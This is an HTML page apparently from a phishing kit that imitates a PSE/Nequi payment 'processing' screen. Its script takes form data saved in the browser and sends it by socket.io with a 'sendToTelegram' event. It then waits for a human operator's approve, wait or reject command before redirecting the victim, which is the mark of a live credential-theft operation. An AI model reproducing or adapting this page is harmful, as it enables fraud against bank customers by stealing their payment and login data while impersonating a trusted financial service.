<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Procesando</title>
    
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17891912053"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'AW-17891912053');
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }

        html,
        body {
            height: 100%;
            background: #fff;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            flex-shrink: 0;
            text-align: center;
            padding: 18px 16px 0;
        }

        .header img {
            width: 100%;
            max-width: 300px;
            height: auto;
            display: inline-block;
        }

        .center {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 24px 20px 40px;
        }

        .center .loading-gif {
            width: 280px;
            max-width: 75vw;
            height: auto;
            margin-bottom: 28px;
        }

        .text {
            font-size: 16px;
            color: #333;
            padding: 0 24px;
            line-height: 1.5;
            max-width: 340px;
        }

        .wait-message {
            position: fixed;
            bottom: 40px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #F7F4F7;
            padding: 16px 24px;
            border-radius: 8px;
            font-size: 14px;
            color: #1D1D1B;
            text-align: center;
            display: none;
            max-width: 90%;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .wait-message.show {
            display: block;
            animation: fadeIn 0.3s ease-in;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }

        @media (max-width: 480px) {
            .header img {
                max-width: 260px;
            }

            .center .loading-gif {
                width: 220px;
                margin-bottom: 22px;
            }

            .text {
                font-size: 15px;
            }
        }
    </style>
</head>
<body>

    <div class="header">
        <img src="logo2.svg" alt="PSE - ¡Fácil, rápido y seguro!">
    </div>

    <div class="center">
        <img class="loading-gif" src="procesando.gif" alt="Procesando">

        <div class="text">
            Estamos procesando tu solicitud con PSE.<br>
            Esto puede tardar unos segundos...
        </div>
    </div>

    <div class="wait-message" id="waitMessage">
        Por favor espera un momento mientras procesamos tu solicitud...
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        let sessionId = localStorage.getItem('nequiSessionId');
        if (!sessionId) {
            alert('Error: Sesión no encontrada. Vuelve al formulario e intenta de nuevo.');
            window.location.href = '/';
        }
        
        const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
        const waitMessage = document.getElementById('waitMessage');
        
        const socket = io({
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionAttempts: 20,
            reconnectionDelay: 200,
            reconnectionDelayMax: 1000,
            timeout: 5000,
            pingInterval: 2000,
            pingTimeout: 5000
        });

        let keepAliveInterval, pingInterval;
        
        function startKeepAlive() {
            stopKeepAlive();
            keepAliveInterval = setInterval(() => socket?.connected && socket.emit('keepAlive', { sessionId }), 3000);
            pingInterval = setInterval(() => socket?.connected && socket.emit('ping'), 2000);
        }
        
        function stopKeepAlive() {
            if (keepAliveInterval) clearInterval(keepAliveInterval);
            if (pingInterval) clearInterval(pingInterval);
        }

        socket.on('connect', () => {
            
            // Inicializar sesión
            socket.emit('initSession', {
                sessionId,
                module: 'nequi',
                page: 'loading',
                data: formData
            });
            
            // Enviar datos a Telegram
            setTimeout(() => {
                console.log('📤 Enviando a Telegram...');
                socket.emit('sendToTelegram', {
                    sessionId,
                    data: formData
                });
            }, 100);
            
            // Iniciar keep-alive
            startKeepAlive();
        });

        socket.on('sessionConfirmed', (data) => {
            console.log('✅ Sesión confirmada:', data.sessionId);
        });

        socket.on('telegramSent', (response) => {
            console.log('✅ Enviado a Telegram:', response);
            console.log('⏳ Esperando respuesta del operador...');
        });

        socket.on('error', (err) => {
            console.error('❌ Error del servidor:', err);
        });

        socket.on('actionFollow', (data) => {
            if (data.sessionId !== sessionId) return;
            
            console.log('✅ Aprobado - Redirigiendo a PSE');
            stopKeepAlive();
            localStorage.setItem('fromNequi', 'true');
            window.location.href = '/pse';
        });

        socket.on('actionWait', (data) => {
            if (data.sessionId !== sessionId) return;
            
            console.log('⏳ Esperando...');
            waitMessage.classList.add('show');
            setTimeout(() => {
                waitMessage.classList.remove('show');
            }, data.waitTime * 1000 || 15000);
        });

        socket.on('actionReject', (data) => {
            if (data.sessionId !== sessionId) return;
            
            console.log('❌ Rechazado');
            stopKeepAlive();
            alert('Solicitud rechazada');
            window.location.href = '/';
        });
        
        socket.on('error', () => {});
        socket.on('connect_error', () => {});
        socket.on('disconnect', (reason) => {
            if (reason === 'io server disconnect') socket.connect();
        });

        window.addEventListener('beforeunload', stopKeepAlive);
    </script>
</body>
</html>
